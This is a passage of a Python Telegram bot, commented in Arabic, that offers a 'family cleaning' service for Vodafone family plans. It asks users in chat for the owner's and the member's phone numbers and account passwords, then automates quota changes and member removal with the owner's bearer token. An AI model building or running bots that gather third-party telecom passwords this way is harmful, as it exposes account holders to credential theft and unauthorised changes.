            # تعديل النسبة لتفادي أخطاء فودافون الشائعة
            update_bar(90)
            change_quota(owner_num, "Bearer " + owner_token, member_num, 40)
            time.sleep(7)
            
        # خطوة 6: الحذف النهائي والتأكيدي المكرر لمسح السلوت
        update_bar(95)
        remove_member(owner_num, "Bearer " + owner_token, member_num)
        time.sleep(2)
        
        # اكتمال العملية
        update_bar(100)
        user_bot.send_message(user_id, f"✅ *تم تنظيف وتصفية محفظة العائلة بنجاح واستعادة السلوت الشاغر بالكامل!*", parse_mode='Markdown')
        
    except Exception as e:
        user_bot.send_message(user_id, f"❌ حدث خطأ تقني غير متوقع أثناء تصفية وتنظيف العائلة.")


def handle_clean_family_trigger(user_id):
    """بدء معالج إدخال بيانات سرفيس تنظيف العائلة"""
    bot_status['user_data'][user_id] = {'action': 'clean_wait_owner_num'}
    user_bot.send_message(user_id, f"🧹 *مرحباً بك في خدمة تنظيف العائلة الذكي.*\n\n📱 يرجى إدخال *رقم الهاتف المالك (Owner):*", parse_mode='Markdown')

def handle_clean_input_steps(message, user_id):
    action = bot_status['user_data'][user_id].get('action')
    text = message.text.strip()
    
    if action == 'clean_wait_owner_num':
        bot_status['user_data'][user_id]['owner_num'] = text
        bot_status['user_data'][user_id]['action'] = 'clean_wait_owner_pass'
        user_bot.send_message(user_id, f"🔑 ممتاز، أرسل الآن *كلمة مرور حساب المالك:*", parse_mode='Markdown')
        
    elif action == 'clean_wait_owner_pass':
        bot_status['user_data'][user_id]['owner_pass'] = text
        bot_status['user_data'][user_id]['action'] = 'clean_wait_member_num'
        user_bot.send_message(user_id, f"📱 خطوة ممتازة، أرسل الآن *رقم الهاتف العضو (Member):*", parse_mode='Markdown')
        
    elif action == 'clean_wait_member_num':
        bot_status['user_data'][user_id]['member_num'] = text
        bot_status['user_data'][user_id]['action'] = 'clean_wait_member_pass'
        user_bot.send_message(user_id, f"🔑 أرسل الآن *كلمة مرور حساب العضو:*", parse_mode='Markdown')
        
    elif action == 'clean_wait_member_pass':
        data = bot_status['user_data'][user_id]
        owner_num = data['owner_num']
        owner_pass = data['owner_pass']
        member_num = data['member_num']
        member_pass = text
        
        del bot_status['user_data'][user_id]
        
        # إرسال رسالة شريط التقدم البدئية
        p_msg = user_bot.send_message(user_id, f"🧹 *جاري تنظيف وتصفية فلوت العائلة حالياً...*\n\n[░░░░░░░░░░░░░░░░░░░░] *0%*")
        
        # إطلاق الخيط بالخلفية لعدم تجميد السيرفر والبولينج
        worker = threading.Thread(
            target=run_family_cleaning_thread_worker, 
            args=(user_id, p_msg.chat.id, p_msg.message_id, owner_num, owner_pass, member_num, member_pass)
        )
        worker.daemon = True
        worker.start()


def run_admin_bot():
    while True:
        try:
            admin_bot.infinity_polling()
        except Exception as e:
            print(f"Admin bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("جاري تشغيل البوتين...")
    print("بوت المستخدمين يعمل الآن")
    print("بوت التحكم يعمل الآن")
    print("لإيقاف البوت اضغط Ctrl+C")
    
    user_thread = threading.Thread(target=run_user_bot)
    admin_thread = threading.Thread(target=run_admin_bot)
    
    user_thread.daemon = True
    admin_thread.daemon = True
    
    user_thread.start()
    admin_thread.start()
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\nتم إيقاف البوتين")